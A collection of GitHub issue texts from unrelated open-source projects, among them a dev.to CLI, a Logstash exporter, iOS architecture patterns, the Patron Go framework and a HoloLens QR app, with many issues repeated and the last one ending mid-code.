Usage: devto <command> [options]

A simple package to let you use Dev.to in Terminal

Options:
  -V, --version                  output the version number
  -h, --help                     output usage information

Commands:
  top [timeline]
  tag|t [tag]
  latest|l
  bookmark|bm
  search|s <keyword>
  author|a [options] <username>
  
  Unknown command lates.

  Did you mean latest?
``` If it could be made that you can read stories right in the terminal it would be perfect. [opn](https://www.npmjs.com/package/opn) was deprecated and renamed to [open](https://www.npmjs.com/package/open) recently. Instead of pressing `ctrl + c` to quit and come back to terminal, it would be handy if pressing just `q` or `esc` do the same. ![Screenshot from 2019-10-26 14-29-49](https://user-images.githubusercontent.com/25279263/67617089-25888000-f7fd-11e9-910a-8a10b64e030d.png)
 How about a feature where we can view the profile details of the user?

Something like:
`devto author anto_christo --profile` 
will display the Name, Email, Location, Work, Joined Date, Links, etc etc on the terminal.

If this feature is needed, I'll add it and send a PR.
Thank you. Instead of pressing `ctrl + c` to quit and come back to terminal, it would be handy if pressing just `q` or `esc` do the same. Instead of pressing `ctrl + c` to quit and come back to terminal, it would be handy if pressing just `q` or `esc` do the same. Selecting `open link` doesn't fire up the browser.
<---------->
167503227
Part 4 should have more theoretical informations on the relation of VEST and STEEM as requested by the moderators. Expand the Post Up and downvotes to print SBD. Expand the Post Up and downvotes to print SBD. Now we have explained to to calculated rshares we can do the actual vote list Now we have explained to to calculated rshares we can do the actual vote list Create and describe a script to list account delegation.  Script printing a sample from a steem engine table. Script printing a sample from a steem engine table.   Update the project wiki so that the tutorial can be read on the wiki as well. Update the project wiki so that the tutorial can be read on the wiki as well. Part 3 should show how to convert VEST to SP Links to Git in Part 1 are broken. Links to Git in Part 1 are broken. Create a token class for an improved Show balances.   Unit Testing Bonus Try out Steem mechanize to see if it brings an improvment.
<---------->
167584751
Can you share the Grafana dashboard as well for this Logstash exporter?  As BonnierNews repo isn't being updated and the owner show almost no activity in any repo in the last year, do you want to "take over" ? your repo looks like its the most up-to-date, it's only missing the docker hub builds so people can  use the new code, without having to rebuild everything I noticed that the metric type for `logstash_node_queue_events` is a counter, for example:

```
$ curl -s localhost:9198/metrics | grep queue_events
# HELP logstash_node_queue_events queue_events
# TYPE logstash_node_queue_events counter
logstash_node_queue_events{pipeline=".monitoring-logstash"} 0
logstash_node_queue_events{pipeline="main"} 0
```

However, the number of queued events will increase and decrease over time as items are pushed onto the queue and pulled off of it. Based on that, I think this should be a [gauge](https://prometheus.io/docs/concepts/metric_types/#gauge) metric type instead. Can you help me understand what might be happening here? I noticed that the metric type for `logstash_node_queue_events` is a counter, for example:

```
$ curl -s localhost:9198/metrics | grep queue_events
# HELP logstash_node_queue_events queue_events
# TYPE logstash_node_queue_events counter
logstash_node_queue_events{pipeline=".monitoring-logstash"} 0
logstash_node_queue_events{pipeline="main"} 0
```

However, the number of queued events will increase and decrease over time as items are pushed onto the queue and pulled off of it. Based on that, I think this should be a [gauge](https://prometheus.io/docs/concepts/metric_types/#gauge) metric type instead. Can you help me understand what might be happening here? As BonnierNews repo isn't being updated and the owner show almost no activity in any repo in the last year, do you want to "take over" ? your repo looks like its the most up-to-date, it's only missing the docker hub builds so people can  use the new code, without having to rebuild everything Can you share the Grafana dashboard as well for this Logstash exporter? 
<---------->
167625367
Slug name of the project: `mind-bicyles`, supposedly should be mind-bicy**c**les. Of course, unless there's a pun embedded there ;-).
 Search the links of the project
Video: https://www.youtube.com/watch?v=M--9jsuDZis Search the links of the project
Video: https://www.youtube.com/watch?v=M--9jsuDZis https://github.com/Bogdan-Lyashenko/codecrumbs https://sketch.systems/

Thanks for making this list btw! This is an amazing resource! https://github.com/zells not sure where to add node-red.  Where to add services like:
- [CodeSandbox](https://codesandbox.io/)
- [Glitch](https://glitch.com/)
- [Repl.it](https://repl.it/)
 Slug name of the project: `mind-bicyles`, supposedly should be mind-bicy**c**les. Of course, unless there's a pun embedded there ;-).
 https://sketch.systems/

Thanks for making this list btw! This is an amazing resource! https://github.com/Bogdan-Lyashenko/codecrumbs Cool tools that are not open source:
- [ ] Retool https://tryretool.com/
<---------->
167632213
let deltaDelay = fabs(previousRun.timeIntervalSinceNow)  > delay ? 0 : delay
 Could you explain more about this implementation.

`func transform(input: SearchViewModel.Input) -> SearchViewModel.Output {`

I could not understand well. The `ViewModel` is some sort of pipeline that for an input it generates one output? Hi, @tailec 

ViewModel has a reference of abstracted ViewController as Delegate in [mvvm-delegation](https://github.com/tailec/ios-architecture/tree/master/mvvm-delegates#mvvm-delegation).
It means that is not MVVM, actually that is MVP.
@amadeu01 mentioned in https://github.com/tailec/ios-architecture/pull/2#issuecomment-459971301 , too.

I have a doubt about https://github.com/tailec/ios-architecture/pull/2#issuecomment-460280849 .

> I think in MVP, presenter can have access to view (imports UIKit) but view models in MVVM are forbidden to do that.

I think differences between MVP and MVVM are those have references of View directly or not.

### Presenter in MVP

Presenter has a reference of View (or ViewController) that is abstracted as protocol in almost cases.
To reflect state of Presenter, it calls method of abstructed View.

```swift
protocol CounterView {
    func didChangeCount(_ presenter: CounterPresenter, count: Int)
}

class CounterViewController: UIViewController, CounterView {
    let presenter: CounterPresenter
    let countLabel: UILabel

    override func viewDidLoad() {
        super.viewDidLoad()

        presenter.view = self
    }

    func countUp() {
        viewModel.countUp()
    }
}

extension CounterViewController: CounterView {
    func didChangeCount(_ presenter: CounterPresenter, count: Int) {
        countLabel?.text = "\(count)"
    }
}

class CounterPresenter {
    private(set) var count: Int = 0 {
        didSet {
             view?.didChangeCount(self, count: count)
        }
    }

    weak var view: CounterView?

    func countUp() {
        count += 1
    }
}
```

### ViewModel in MVVM

ViewModel must not depend on View (or ViewController).
Even if View is abstracted as Protocol, ViewModel must not depend on them.
To reflect state of ViewModel, it notifies changes of state with closure (or RxSwift.Observable and so on).
Closure is implemented outside of ViewModel, therefore ViewModel does not depend on View directly.

```swift
class CounterViewController: UIViewController {
    let viewModel: CounterViewModel
    let countLabel: UILabel

    override func viewDidLoad() {
        super.viewDidLoad()

        viewModel.countChanged = { [weak countLabel] count in
            countLabel?.text = "\(count)"
        }
    }

    func countUp() {
        viewModel.countUp()
    }
}

class CounterViewModel {
    private(set) var count: Int = 0 {
        didSet {
             countChanged?(count)
        }
    }

    var countChanged: ((Int) -> Void)?

    func countUp() {
        count += 1
    }
}
``` Could you explain more about this implementation.

`func transform(input: SearchViewModel.Input) -> SearchViewModel.Output {`

I could not understand well. The `ViewModel` is some sort of pipeline that for an input it generates one output? Please add clean swift (VIP) architecture... :)

https://hackernoon.com/introducing-clean-swift-architecture-vip-770a639ad7bf


<---------->
167809514
Even though WTFPL is mentioned in readme, I think it is pretty standard to add a license text file. Most GitHub users look for license information in the bar at the top, which is detected from the license text file.

BTW thank you for creating all these wonderful projects on OpenGL. The article contains a small typo. I do not know how to send a pull request for the Wiki, so I have attached the diff that fixes this typo.

[fix-typo.txt](https://github.com/ssloy/tinykaboom/files/2815289/fix-typo.txt) The article contains a small typo. I do not know how to send a pull request for the Wiki, so I have attached the diff that fixes this typo.

[fix-typo.txt](https://github.com/ssloy/tinykaboom/files/2815289/fix-typo.txt) Even though WTFPL is mentioned in readme, I think it is pretty standard to add a license text file. Most GitHub users look for license information in the bar at the top, which is detected from the license text file.

BTW thank you for creating all these wonderful projects on OpenGL.
<---------->
167976108
  A click could open custom screen with intents opening social media Rearrange attributes, convert to ConstraintLayout Add nicer layout, click on slack text leads to slack address.
Extract res to the ViewModel?

Optional: add support for opening apps with intents.   After adding a lot of notes, the WTM sing goes out of view, that should not be the case. Wrap ScrollView better or change drawable attached to a TextView to an ImageView  Exclude Views that shouldn't be reversed when a user switches to dark mode, for example, photos ImageView is packed inside of a card, it doesn't have to be stay like this, but it should fill the full width of the screen as in the previous versions fix layout, align symbols and text In the simplest form it could use the Firebase Cloud Messaging and work as follows:

Before stream we send a push to the app which contains the link as an extra data, clicking the notification opens the periscope website/app. 

In the next step we could consider saving the url to the database so it is accessible from the event's detail screen.  Ideally logo + name + twitter symbol and twitter handle Click at the specific review should open specific event. I used the debugger to retrieve values for the navigation and ViewModel

- lftrcqyxnbpb Flutter Study Jam part 1

- 251198434 Google Assistant 

- lcdxqpyxhbtb Android Study Jam ScrollView should scroll a bit further displaying the ending line of the last card  add slack, code of conduct contributions link, 
add license,
add short description with tech stack  
<---------->
167987804
Explicar como inserir as bases de dados no padrão de contribuição no markdown de cada esfera. O arquivo é CONTRIBUTING.md. Seria legal também mostrar como sincronizar o repositório para não gerar conflitos, mostrar como é o padrão do markdown com um exemplo e criar um padrão para fechar issues para identificar melhor os commits e pull requests. Ainda não descobrimos como colocar uma coisa bem simples: o favicon. Infelizmente ele não 'pega' da forma como colocamos na head, e talvez tenha alguma particularidade no Jekyll que a gente não tenha sacado. Por enquanto, só um papel branco :( Analisando no [SEO Alalyzer](https://www.seocentro.com/tools/seo/seo-analyzer.html) do SEO Centro há alguns _warnings_ e _errors_ como:

- Title relevancy to webpage content is terrible.
- Description is smaller than 80 characters (28 characters).
- Robots.txt file has not been found.
- No XML Sitemap has been found. Precisamos criar uma nova aba no menu do site, que tenha a mesma estrutura da home (onde estão os assuntos das bases). A ideia e criar postagens, usando md tbm, sobre avanços do projeto e os impactos que ele vem causando. Como uma espécie de balanço do mês. A estrutura com apenas a criação de mds será mais simples para alimentação posterior.  Fazer tags para as bases e quando clicar nas tags, listar as bases correspondentes. Descrever mais detalhadamente sobre as contribuições.   Percebi que os arquivos .md do projeto estāo escritos em HTML. No Jekyll, podemos escrever eles usando [Markdown](https://daringfireball.net/projects/markdown/), o que torna a leitura e manutenção das páginas mais fácil.

Pra quem for ver no ar, vai aparecer HTML normalmente. Pode ser que tenham algumas seções definidas nesses arquivos que precisem de um layout extra ou algum outro fix. Queríamos elaborar uma ferramenta de busca dentro do site para qualquer palavra-chave que se coloque. Assim, já na home, o usuário escreveria o que está procurando e uma seleção sobre aquela palavra apareceria. Mais fácil que ele entrar em cada assunto e dar 'crtl+f'. Fazer tags para as bases e quando clicar nas tags, listar as bases correspondentes. Analisando no [SEO Alalyzer](https://www.seocentro.com/tools/seo/seo-analyzer.html) do SEO Centro há alguns _warnings_ e _errors_ como:

- Title relevancy to webpage content is terrible.
- Description is smaller than 80 characters (28 characters).
- Robots.txt file has not been found.
- No XML Sitemap has been found. Sugiro adicionar o site de dados abertos da Prefeitura da cidade do Rio de Janeiro: http://www.data.rio Precisamos criar uma nova aba no menu do site, que tenha a mesma estrutura da home (onde estão os assuntos das bases). A ideia e criar postagens, usando md tbm, sobre avanços do projeto e os impactos que ele vem causando. Como uma espécie de balanço do mês. A estrutura com apenas a criação de mds será mais simples para alimentação posterior.  Criar uma nova aba no menu para registrar o nome de todos os colaboradores. Desta forma, sempre que alguém ajudar com alguma PR, issue ou mandar uma base de dados maneira, vai ter o seu nome figurando na listagem de colaboradores. :) Ainda não descobrimos como colocar uma coisa bem simples: o favicon. Infelizmente ele não 'pega' da forma como colocamos na head, e talvez tenha alguma particularidade no Jekyll que a gente não tenha sacado. Por enquanto, só um papel branco :(  Criar uma nova aba no menu para registrar o nome de todos os colaboradores. Desta forma, sempre que alguém ajudar com alguma PR, issue ou mandar uma base de dados maneira, vai ter o seu nome figurando na listagem de colaboradores. :) Percebi que os arquivos .md do projeto estāo escritos em HTML. No Jekyll, podemos escrever eles usando [Markdown](https://daringfireball.net/projects/markdown/), o que torna a leitura e manutenção das páginas mais fácil.

Pra quem for ver no ar, vai aparecer HTML normalmente. Pode ser que tenham algumas seções definidas nesses arquivos que precisem de um layout extra ou algum outro fix. Nesse link as pessoas serão redirecionadas para a inscrição na Newsletter
<---------->
168026024
Spotify has a new [end user agreemeent](https://www.spotify.com/us/legal/end-user-agreement).  How does this change strategy? @colejackes  It seems that the current iteration of **Get Rec'd** is not deployed online.  This is concerning, considering symposium is < 48 hours away.  @rishigoel @colejackes can we get some eyes on this? 

Pls and thx
🎅🏿 @rishigoel @ndey96 I am not feeling like I have been `recd` yet.  What is the ETA on `rec`?  https://itunes.apple.com/us/app/pacemaker-ai-dj-app/id593873080

Has any competitive / comparative analysis been done on this product?  I tried to use it today and its Spotify integration continued to fail -_- 

@colejackes @rishigoel @ndey96 @rishigoel @ndey96 I am not feeling like I have been `recd` yet.  What is the ETA on `rec`? 
<---------->
168258219
Hello. Is there any plans to support multiple indexes? This could be handy for searching multiple different types of documents with different settings, for example, users and logs. The `read_from_file` function in [helper.js](https://github.com/nextapps-de/flexsearch-server/blob/master/helper.js) uses a deprecated [`fs.exists()` method](https://nodejs.org/api/fs.html#fs_fs_exists_path_callback) before attempting to `readFile()`. 

Might be better do something like...

```javascript
read_from_file: () => {
    fs.open(filename, 'r', (err, fd) => {
        if (err) {
            if (err.code === 'ENOENT') {
                console.error(filename + 'does not exist')
                return
            }
        }
        throw err
    }
    fs.readFile(fd) ...
}
```
<---------->
168350577
## Is your feature request related to a problem? Please describe

A previous issue #19 pointed out the need to expose some kind of "healthiness" of a async component.
We would like to that this on step further and support this foe every component of the service.

The requirements for this are the following:

- Each component (sync/async) should notify it's health to a central health check object
- This object will be used from the HTTP health check endpoint to determine the result
- The result will be determined by code written by the framework user
- The result should contain, along with the final decision, all the health data from the components.

We should investigate the following:

- Should we support readiness and liveness at the component level?
- How will this work in conjunction with the retry policy of async components?
 ## The problem

Our service has a health endpoint for deploying our service in staging and production environments. It also relies upon Kafka for receiving critical data for its operation. Thus the connection with Kafka nodes determines our service readiness. 

So far our readiness detection relied upon receiving the first message from a Kafka topic:
```
func (kc *kafkaComponent) Process(msg async.Message) error {
        .....

	if !kc.gotMessage {
		kc.ch <- true
		kc.gotMessage = true
	}
```

note: `kc.ch` notifies our health component

However, in environments with low traffic or zero traffic, that strategy caused problems with our existing deployment tools.

In order for our service to respond correctly to readiness requests, we need a mechanism that notifies heath component when we are successfully connected to kafka, not when we receive the first message.

Unfortunately I could not find a workaround without requiring additions in the patron framework. 
Due to blocking nature of run and the retry strategy mechanism introduced in async component, there is no way to determine if the async component is successfully content and ready to consume.

## Solution
I think the simplest solution would be to introduce a readiness handler option for the async component:

```
cmp, err := async.New(
    "kafka-topic", 
    kafkaCmp.Process, 
    cf, 
    async.ConsumerRetry(retries, retryTimeout)
    async.ReadinessHandler(func() {
        kc.ch <- true
    })
)
```

Apart for service readiness this handler could be useful in other cases such as debugging and logging.  ## Issue

I get the following error when running the tests of a specific package:
```
go test ./async   
# github.com/prometheus/client_golang/prometheus
../../go/pkg/mod/github.com/prometheus/client_golang@v0.9.1/prometheus/collector.go:62:17: undefined: Metric
../../go/pkg/mod/github.com/prometheus/client_golang@v0.9.1/prometheus/collector.go:102:7: undefined: Metric
FAIL    github.com/thebeatapp/patron/async [build failed]
```

However when I run:
`go test ./...` It succeeds, but first updates my go.mod file :

 ```
 github.com/prometheus/client_golang v0.9.1 h1:K47Rk0v/fkEfwfQet2KWhscE0cJzjgCCDBG2KHZoVno=
 github.com/prometheus/client_golang v0.9.1/go.mod h1:7SWBe2y4D6OKWSNQJUaRYU/AaXPKyh/dDVn+NZz0KFw=
+github.com/prometheus/client_golang v0.9.2 h1:awm861/B8OKDd2I/6o1dy3ra4BamzKhYOiGItCeZ740=
+github.com/prometheus/client_golang v0.9.2/go.mod h1:OsXs2jCmiKlQ1lTBmv21f2mNfw4xf/QclQDMrYNZzcM=
```
It a bit wired behavior, If I had to guess is something related with this one:
https://github.com/prometheus/client_golang/pull/501

After adding the v0.9.2, everything works fine 

## Solution

I would suggest upgrading the client_golang to v0.9.2 ## Is your feature request related to a problem? Please describe

We need a option to allow for custom header for decode/encode payload over HTTP.

## Describe the solution

- HTTP component has to accept a new Encoding option.
- The new functions have to be added to the currently supported ones, or overwrite them ## Is your feature request related to a problem? Please describe
At the moment when using Patron it is necessary to include input validation logic at the http level when using the request body.
For example:
```
	var cmd book.AddBookCommand
	err = req.Decode(&cmd)
        // Here we need to add validation logic for the command
``` 

## Is this a bug? Please provide steps to reproduce, a failing test etc.
No.

## Describe the solution
I suggest adding a `Validator` interface which returns `[]error` (or a struct which contains the same) and changing the `Request.Decode` method to accept a validator, so the code will look something like this:
```
	var cmd book.AddBookCommand
	err = req.Decode(&cmd, book.AddBookCommandValidator{})
``` ## Is your feature request related to a problem? Please describe

Every component in Patron returns some information and along with information from the service itself is then accessible via HTTP GET /info.
It seems that this feature:

1. Is not used very much
2. Complicates the code and brings in dependencies
3. Exposes internal information which could contain sensitive information (env vars)

## Describe the solution

Remove the info feature from all code base. <!--
Welcome to the patron framework project.

- Please search for existing issues to avoid creating duplicate bugs/feature requests.
- Please be respectful and considerate of others when commenting on issues.
- Please provide as much information as possible so we all understand the issue.

-->

## Is your feature request related to a problem? Please describe

While working on the examples that Patron provides (refer to this: `https://github.com/beatlabs/patron/tree/master/examples/first`) I observed that the metrics have an issue. More specifically, code status counters and request counters do not increase as they should be. The issue was observed in v0.23 and v0.24 of Patron. 

## Is this a bug? Please provide steps to reproduce, a failing test etc.

When I hit the `POST` `localhost:50000/`, I receive a `500 Internal Server Error`. The counter for `sync_requests{endpoint="POST-/",error="false"}` is increased by one (here we expected an increase to `error="true"`). Furthermore,  we do not have an increase of the `sync_http_requests{endpoint="POST-/",status_code="5xx"}` counter. I observed the results through `localhost:50000/metrics`.
 ## Is your feature request related to a problem? Please describe

After splitting the consumer group types in different packages #70 we can now support consumer groups on multiple topics.
 ## Is your feature request related to a problem? Please describe
In version 0.19 removed the ability to consume kafka messages without using groups. 

## Is this a bug? Please provide steps to reproduce, a failing test etc.
This is not a bug. 

## Describe the solution
A solution would be to allow clients to consume without specifying cgroups. ## Is your feature request related to a problem? Please describe

Every component in Patron returns some information and along with information from the service itself is then accessible via HTTP GET /info.
It seems that this feature:

1. Is not used very much
2. Complicates the code and brings in dependencies
3. Exposes internal information which could contain sensitive information (env vars)

## Describe the solution

Remove the info feature from all code base. ## Is your feature request related to a problem? Please describe
At the moment when using Patron it is necessary to include input validation logic at the http level when using the request body.
For example:
```
	var cmd book.AddBookCommand
	err = req.Decode(&cmd)
        // Here we need to add validation logic for the command
``` 

## Is this a bug? Please provide steps to reproduce, a failing test etc.
No.

## Describe the solution
I suggest adding a `Validator` interface which returns `[]error` (or a struct which contains the same) and changing the `Request.Decode` method to accept a validator, so the code will look something like this:
```
	var cmd book.AddBookCommand
	err = req.Decode(&cmd, book.AddBookCommandValidator{})
``` <!--
Welcome to the patron framework project.

- Please search for existing issues to avoid creating duplicate bugs/feature requests.
- Please be respectful and considerate of others when commenting on issues.
- Please provide as much information as possible so we all understand the issue.

-->

## Is your feature request related to a problem? Please describe

General Middleware stack run after route has been resolved but this result in problem when CORS middleware is implemented.
When http.Router runs if method is OPTIONS follows a different path before resolve the route and run the handler (where we have chained the middleware stack) so middlewares never run.

## Is this a bug? Please provide steps to reproduce, a failing test etc.

Not a bug just a wrong implementation of the middleware feature.
Generic middlewares should run before route is resolved.

## Describe the solution

We need to change middleware signature as 
```go
type MiddlewareFunc func(next http.Handler) http.Handler
```
And use Router that implements http.Handler interface to wrap and chain the middlewares.
So middlewares should be as:
```go
newMiddleware := func(h http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        ...
        // Next
        h.ServeHTTP(w, r)
    })
}```

## Additional context
This is PATCH for the previous middleware implementation and needs further development afterwards by unifying the default middlewares of tracing and auth with this mechanism. <!--
Welcome to the patron framework project.

- Please search for existing issues to avoid creating duplicate bugs/feature requests.
- Please be respectful and considerate of others when commenting on issues.
- Please provide as much information as possible so we all understand the issue.

-->

## Is your feature request related to a problem? Please describe

Framework has no generic middleware stack mechanism for default http component.
We want to be able to introduce middleware to routes such as CORS middleware etc.

## Is this a bug? Please provide steps to reproduce, a failing test etc.

This is not a bug but an enhancement.

## Describe the solution

We should be able to set in main service as an OptionFunc and then in the default http component as a slice of MiddlewareFunc, that are applied on all routes chained in order after the default middlewares of auth and tracing.

## Additional context

We can take this feature even further:
1. POST/PRE middleware
2. Per route middleware <!--
Welcome to the patron framework project.

- Please search for existing issues to avoid creating duplicate bugs/feature requests.
- Please be respectful and considerate of others when commenting on issues.
- Please provide as much information as possible so we all understand the issue.

-->

## Is your feature request related to a problem? Please describe

This is not a problem, more an enhancement. The issue is complementary to issue #39 and adds authenticated method helpers for PATCH, HEAD and OPTIONS like POST, PUT etc.
So, the only way to create these kind of routes is use http.NewRoute().

## Is this a bug? Please provide steps to reproduce, a failing test etc.

It is not a bug.

## Describe the solution

We just add the auth helper methods for PATCH, HEAD and OPTIONS.

## Additional context
 ## Is your feature request related to a problem? Please describe

In order to improve resilience to data loss we need to change the default level of acknowledgement reliability (WaitForLocal). 

## Describe the solution

We need to add an OptionFunc to expose sarama's Producer.RequiredAcks option. The different values allowed are:

- 0 doesn't send any response, the TCP ACK is all you get.
- 1 waits for only the local commit to succeed before responding.
- -1 waits for all in-sync replicas to commit before responding.
	 <!--
Welcome to the patron framework project.

- Please search for existing issues to avoid creating duplicate bugs/feature requests.
- Please be respectful and considerate of others when commenting on issues.
- Please provide as much information as possible so we all understand the issue.

-->

## Is your feature request related to a problem? Please describe

While working on the examples that Patron provides (refer to this: `https://github.com/beatlabs/patron/tree/master/examples/first`) I observed that the metrics have an issue. More specifically, code status counters and request counters do not increase as they should be.

## Is this a bug? Please provide steps to reproduce, a failing test etc.

When I hit the `POST` `localhost:50000/`, I receive a `500 Internal Server Error`. The counter for `sync_requests{endpoint="POST-/",error="false"}` is increased by one (here we expected an increase to `error="true"`). Furthermore,  we do not have an increase of the `sync_http_requests{endpoint="POST-/",status_code="5xx"}` counter. I observed the results through `localhost:50000/metrics`.
 <!--
Welcome to the patron framework project.

- Please search for existing issues to avoid creating duplicate bugs/feature requests.
- Please be respectful and considerate of others when commenting on issues.
- Please provide as much information as possible so we all understand the issue.

-->

## Is your feature request related to a problem? Please describe

<!-- REQUIRED A clear and concise description of what the problem is. --> 
Patron currently uses one environmental variable to set the jaeger agent address.
This discourages the kubernetes configuration from using a dynamic assignment to the agent address because the agent address which works as a daemon is different for each pod.   

## Describe the solution

<!-- OPTIONAL A clear and concise description of what you want to happen. -->
Split the address into two variables that define the host and port. This would make the configuration dynamic.

## Additional context**

<!-- OPTIONAL Add any other context or screenshots about the feature request here. -->
 <!--
Welcome to the patron framework project.

- Please search for existing issues to avoid creating duplicate bugs/feature requests.
- Please be respectful and considerate of others when commenting on issues.
- Please provide as much information as possible so we all understand the issue.

-->

## Is your feature request related to a problem? Please describe

<!-- REQUIRED A clear and concise description of what the problem is. --> 
Patron currently uses one environmental variable to set the jaeger agent address.
This discourages the kubernetes configuration from using a dynamic assignment to the agent address because the agent address which works as a daemon is different for each pod.   

## Describe the solution

<!-- OPTIONAL A clear and concise description of what you want to happen. -->
Split the address into two variables that define the host and port. This would make the configuration dynamic.

## Additional context**

<!-- OPTIONAL Add any other context or screenshots about the feature request here. -->
 Currently the RabbitMQ consumer(async/amqp/amqp.go) uses hardcoded configuration for the exchange/queue/bindings .

This is problematic both when patron runs on a clean Rabbit installation(as the client should provide the desired configuration), but also when the Rabbit instance has been configured, as the client will fail if a queue or exchange with a given name already exists, but has different configuration(for example if the exchange type[direct, fanout, etc] is different)

We need to update amqp, to allow the clients provide the configuration ## Is your feature request related to a problem? Please describe

In order to support the consumer features better, we should split up the consumer types (consumer group and simple).
This will enable us to create the consumer group with support for multiple topics.

## Describe the solution

The package structure should be the following:

- kafka
  - group (support for consumer groups)
  - simple (no consumer groups)

where kafka root contains all the common code and group and simple only the one required for consumer type.
<---------->
168421240
All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

# What needs to be accomplished
Create an empty Unity app to work in.
<ul>
<li>Delete the SampleScene</li>
<li>Change skybox to allow transparency for the HoloLens</li>
<li>Follow Microsoft tutorials for specific changes</li>
</ul>

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

# What needs to be accomplished
Create an empty Unity app to work in.
<ul>
<li>Delete the SampleScene</li>
<li>Change skybox to allow transparency for the HoloLens</li>
<li>Follow Microsoft tutorials for specific changes</li>
</ul>

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
Edit the files created in **Issue #2** and **Issue #3**

To do this, we will utilize a QR code created using the resource found in **Issue #4**. In the files used to complete the QR code scanner of **Issue #2**, create a variable that can be used to store the URL scanned in from the QR code. In the files from **Issue #3**, replace the hard-coded URL with the variable that was just created for storing the URL from the QR code.

If the variable is in a different file than the one used to render the object, the variable can be made `static` to allow access from different files.

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
Look for a resource that can be used to create a QR code to a given URL.

This resource will most likely be a separate website or application. Once a quality, trustable resource is found, save it for future reference. Any teams or individuals that may work with the application will most likely need to use the resource to create new QR codes in the future.

Close the issue once completed. This issue may or may not need to be pushed. Pairing of the URL and QR code will most likely be outside of the application. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
Search for the WWW library provided with Unity.

Before implementing URL rendering to the QR code, try to render an object from a hard-coded URL.

To get the URL, make a new branch called `objects` from the blank empty app in **Issue #1**. Create prefab or object file using Unity, and push it to the `objects` branch. We will use this to store the objects to mock a file system like that available to professors at UH Manoa. It will create a URL where the files are unrelated/outside of the application. 

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

# What needs to be accomplished
Follow tutorials to create QR code scanner.

There should be tutorials on various methods to scan QR codes. The ZXing library can be used to scan both 1D (barcode) and 2D (Qr code) images. Unity might have a library or Asset Store download that can readily scan QR codes. Microsoft documentation suggests that there is a plugin called QRTracking that can also be used for similar purposes.

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
Create a UI that the user can use to select which object he/she wants to have rendered in the world space. This might require the object renderer from **Issue #5** to be edited to have only one object rendered at a time.

Look up guides from making UIs in AR/VR. All the elements and buttons of the UI need to be along the same position on the z-axis. This is because AR uses a perspective camera to give the world space a natural feel to the viewer. 

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

# What needs to be accomplished
Follow tutorials to create QR code scanner.

There should be tutorials on various methods to scan QR codes. The ZXing library can be used to scan both 1D (barcode) and 2D (Qr code) images. Unity might have a library or Asset Store download that can readily scan QR codes. Microsoft documentation suggests that there is a plugin called QRTracking that can also be used for similar purposes.

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
In a educational scenario, the instructor might not want the same QR code to appear more than once in a set of slides. Create a way to temporarily store the objects or its URL so the user can render the object again at a later date.

This might be able to be done using a `List` and pushing the URL to the List upon scanning. Again, both the object renderer and QR scanner might need to be edited to allow this functionality. That is, perhaps we don't want to render the object right when the QR code is scanned. We need to remove the URL variable from the renderer, create a new variable that can be set to the URL chosen in the UI, and pass that variable to the renderer.

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
Create a way to add multiple files for rendering object by giving a URL to a folder containing all the files.

This can work in parallel to the previous changes we've made for putting a single object into the library. It would cover the cases of individual objects vs group of objects.

*This might fall outside the scope of the project.* 

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

# What needs to be accomplished
Add some way for the user to access the QR code scanner/camera again to scan multiple Asset Bundles into the program.

This could be done by way of a button or gesture.

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
Search for the WWW library provided with Unity.

Before implementing URL rendering to the QR code, try to render an object from a hard-coded URL.

To get the URL, make a new branch called `objects` from the blank empty app in **Issue #1**. Create prefab or object file using Unity, and push it to the `objects` branch. We will use this to store the objects to mock a file system like that available to professors at UH Manoa. It will create a URL where the files are unrelated/outside of the application. 

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
Create a way to add multiple files for rendering object by giving a URL to a folder containing all the files.

This can work in parallel to the previous changes we've made for putting a single object into the library. It would cover the cases of individual objects vs group of objects.

*This might fall outside the scope of the project.* 

Close the issue once completed and move to 'Waiting for merge' in Project. All work that is done for this task will be in a in a branch called issue-XX, where XX is the issue number.

## What needs to be accomplished
In a educational scenario, the instructor might not want the same QR code to appear more than once in a set of slides. Create a way to temporarily store the objects or its URL so the user can render the object again at a later date.

This might be able to be done using a `List` and pushing the URL to the List upon scanning. Again, both the object renderer and QR scanner might need to be edited to allow this functionality. That is, perhaps we don't want to render the object right when the QR code is scanned. We need to remove the URL variable from the renderer, create a new variable that can be set to the URL chosen in the UI, and pass that variable to the renderer.

The reason `List` might be the best approach is that it will allow us to easily append a new value to the end of the `List`, unlike `Arrays`. Additionally, the `List` can be initialized at the start of the program as empty, so that the 'database' is empty each time the application is started. This effectively acts like a temporary library.

Close the issue once completed and move to 'Waiting for merge' in Project.
<---------->
168454015
I have successfully run parser and see pos/dependency result same as with stanfordnlp.
But when I run Matcher over tokens I see unexpected matchs.
For example I should get only PROPN+ tokens but I see verb matches as well.
And empty match...

I have gone through following code here but I could not see something related with Matcher.
https://github.com/explosion/spacy-stanfordnlp/blob/master/spacy_stanfordnlp/language.py

BTW, default installation comes with spacy-nightly 6a and I have tried with 9a as well. 

```python
import stanfordnlp
from spacy_stanfordnlp import StanfordNLPLanguage
from spacy.matcher import Matcher
import csv

config = {
    'processors': 'tokenize,pos,lemma', #mwt, depparse
